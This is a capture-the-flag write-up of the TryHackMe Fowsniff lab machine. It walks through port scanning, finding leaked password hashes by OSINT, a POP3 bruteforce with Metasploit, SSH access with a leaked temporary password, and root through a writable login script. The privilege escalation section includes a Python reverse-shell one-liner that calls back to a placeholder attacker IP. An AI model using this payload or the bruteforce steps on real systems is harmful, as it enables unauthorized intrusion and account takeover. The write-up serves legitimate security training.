# TryHackMe — Fowsniff CTF

**Platform:** TryHackMe  
**Difficulty:** Easy/Medium  
**Category:** OSINT · Bruteforce · Privilege Escalation  
**Date:** 05/06/2026

---

## Objective

Gain root access to the Fowsniff machine by chaining together OSINT, credential cracking, POP3 bruteforce, and privilege escalation via a writable script executed at login.

---

## Tools Used

|Tool|Purpose|
|---|---|
|Nmap|Port scanning and service enumeration|
|Gobuster|Web directory enumeration|
|CrackStation|Online MD5 hash cracking|
|Metasploit (`scanner/pop3/pop3login`)|POP3 bruteforce|
|Telnet|Manual POP3 interaction|
|Netcat|Reverse shell listener|
|Python3|Reverse shell payload|

---

## Methodology

### 1. Recon

Started with a full port scan to identify running services:

```bash
nmap -sV -sC -oN fowsniff.nmap <TARGET_IP>
```

**Open ports:**

|Port|Service|Notes|
|---|---|---|
|22|SSH|OpenSSH|
|80|HTTP|Web server|
|110|POP3|Mail service|
|143|IMAP|Mail service|

Having SSH, HTTP, POP3 and IMAP open is a significant attack surface. POP3 and IMAP immediately suggest the possibility of harvesting credentials from emails.

Then ran Gobuster to enumerate hidden web directories:

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```

Found a `security.txt` file containing a message stating the company had been pwned by a user called `B1gN1nj4`.

---

### 2. OSINT

Searched Google for the company name (`Fowsniff`) combined with `B1gN1nj4`. Found a GitHub repository from that user containing a leaked file with employee usernames and their MD5 password hashes.

> **Note:** I initially wasted time looking for the leaked data in obscure places. The answer was a straightforward Google search. Lesson: always start with the simplest approach.

Pasted all hashes into [CrackStation](https://crackstation.net). All hashes cracked successfully except one.

---

### 3. Exploitation

**POP3 Bruteforce with Metasploit**

Built a `USERPASS_FILE` with all username/password combinations (one pair per line, space-separated), then launched the Metasploit POP3 login scanner:

```bash
msfconsole
use scanner/pop3/pop3login
set RHOSTS <TARGET_IP>
set RPORT 110
set USERPASS_FILE /path/to/userpass.txt
run
```

Valid credentials found for user: `seina`

**Accessing POP3 via Telnet**

```bash
telnet <TARGET_IP> 110
USER seina
PASS <password>
LIST
RETR 1
RETR 2
```

Found two emails in the inbox:

- **Email 1 (from Stone):** Notifies all staff about the breach and provides a temporary SSH password, asking everyone to change it immediately.
    
    ![SSH credentials leaked in internal email](./assets/fowsniff3.jpg)
    
- **Email 2 (from baksteen):** Baksteen replies to Stone's email saying he'll read it later — meaning he never saw the temporary password warning and never changed it. This gives us a valid SSH entry point.
    

> **Note:** I had the password from Email 1 but got stuck trying random usernames via SSH. I rushed past the second email assuming it was irrelevant. Going back and reading it carefully revealed that `baksteen` was the user who never changed his credentials. The answer was already in my hands, I just hadn't read everything.

---

### 4. Privilege Escalation

SSH into the machine as `baksteen` using the temporary password:

```bash
ssh baksteen@<TARGET_IP>
```

Upon login, a Python script runs automatically, displaying an ASCII art banner. Checking permissions:


![Corporate banner and security message](./assets/fowsniff2.jpg)


```bash
ls -la /path/to/script
```

The script is **owned by root but writable by the current user** — a critical misconfiguration. Any code injected here will execute as root on every login.

> **Note:** I didn't immediately know how to proceed here. After researching reverse shells I realized the writable auto-run script was the vector, I already had everything I needed. Sometimes the path forward is already in front of you.

Injected a Python reverse shell into the script:

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Started a listener on the attacker machine:

```bash
nc -lvnp <PORT>
```

Logged out and back in via SSH. The script executed automatically, triggering the reverse shell. Got a root shell.

![Successful privilege escalation to root](./assets/fowsniff.png)

---

## Key Takeaways

**OSINT before brute force.** The most valuable data (leaked credentials) was on a public GitHub repo, findable with a simple Google search. Always exhaust passive recon before reaching for active tools.

**Read everything.** The second email looked irrelevant but contained the critical detail — baksteen hadn't changed his password. Missing it would have killed the attack chain.

**File permissions matter.** A script executed automatically at login, writable by a non-root user, is a direct path to privilege escalation. Even if the file is owned by root, write permission for others breaks the security model entirely.

---

## Attack Chain Summary

```
Nmap → open ports (SSH, HTTP, POP3, IMAP)
  ↓
Gobuster → security.txt → company breached by B1gN1nj4
  ↓
OSINT (Google) → GitHub repo → leaked MD5 hashes
  ↓
CrackStation → plaintext passwords
  ↓
Metasploit POP3 bruteforce → valid creds (seina)
  ↓
Telnet POP3 → emails → temporary SSH password
  ↓
SSH as baksteen (never changed password)
  ↓
Writable login script → Python reverse shell → root
```